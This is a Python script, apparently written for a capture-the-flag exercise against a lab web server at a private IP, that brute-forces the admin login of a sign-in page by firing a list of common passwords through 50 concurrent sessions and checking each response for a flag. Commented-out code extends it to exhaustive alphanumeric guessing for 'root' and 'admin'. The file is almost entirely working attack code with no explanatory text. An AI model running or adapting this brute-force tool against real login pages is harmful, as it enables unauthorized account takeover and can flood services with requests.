from bs4 import BeautifulSoup
import grequests
import requests
import string
import itertools
import sys


# def request_answer(username,password):
#     source = requests.get("http://192.168.56.11/index.php?page=signin&username={}&password={}&Login=Login#".format(username,password))
#     if "flag" in source:
#         print(username,password)
#         return True
#     else:
#         return False

lst_pass = [
        "1234",
        "12345",
        "123456",
        "1234567",
        "12345678",
        "123456789",
        "123123",
        "654321",
        "000000",
        "111111",
        "222222",
        "333333",
        "444444",
        "555555",
        "666666",
        "777777",
        "888888",
        "999999",
        "admin",
        "Admin",
        "dragon",
        "iloveyou",
        "letmein",
        "lovely",
        "qwertyuiop",
        "monkey",
        "photoshop",
        "princess",
        "sunshine",
        "shadow",
        "abc123",
        "qwerty",
        "qwerty123",
        "azerty",
        "azerty123",
        "adobe",
        "adobe123",
        "1q2w3e4r",
        "password",
        "password1",
        "123qwe",
        ]
#password=(123456 password 12345678 qwerty abc123 123456789 111111 1234567 iloveyou adobe123 123123 Admin 1234567890 letmein photoshop 1234 monkey shadow sunshine 12345 password1 princess azerty trustno1 000000)


def brute_force():
    NUM_SESSIONS = 50
    sessions = [requests.Session() for i in range(NUM_SESSIONS)]
    links = []
    for s in lst_pass:
        links.append("http://192.168.56.11/index.php?page=signin&username=admin&password={}&Login=Login#".format(s))
    reqs = []
    for j, url in enumerate(links):
        reqs.append(grequests.get(url, session=sessions[j % NUM_SESSIONS]))
    sources = grequests.imap(reqs, size=NUM_SESSIONS*5)
    for r in sources:
        if "flag" in r.text:
            print(r.url)


#def brute_force():
#    lst = string.ascii_lowercase+ string.ascii_uppercase+string.digits
#    login = ['root', 'admin']
#    content = set()
#    NUM_SESSIONS = 50
#    sessions = [requests.Session() for i in range(NUM_SESSIONS)]
#    for i in range(2, 6):
#        print(i)
#        reqs = []
#        for j,a  in enumerate(itertools.combinations_with_replacement(lst, i)):
#            s = ""
#            for j in a:
#                s += j
##        for s in lst_pass:
#            url1 = "http://192.168.56.102/index.php?page=signin&username={}&password={}&Login=Login#".format(login[0], s)
#            url2 = "http://192.168.56.102/index.php?page=signin&username={}&password={}&Login=Login#".format(login[1], s)
#            print(url1)
#            reqs.append(grequests.get(url1, session=sessions[(2 * j) % NUM_SESSIONS]))
#            reqs.append(grequests.get(url2, session=sessions[(2 * j + 1) % NUM_SESSIONS]))
#        print("to explore : ", len(reqs))
#        sources = grequests.map(reqs , size=NUM_SESSIONS* 5)
#        for r in sources:
#            print(r.url)
#            content.add(r.text)
#            if 'flag' in r.text:
#                print(r.url)
#        print(content)
#        print(len(content))

brute_force()


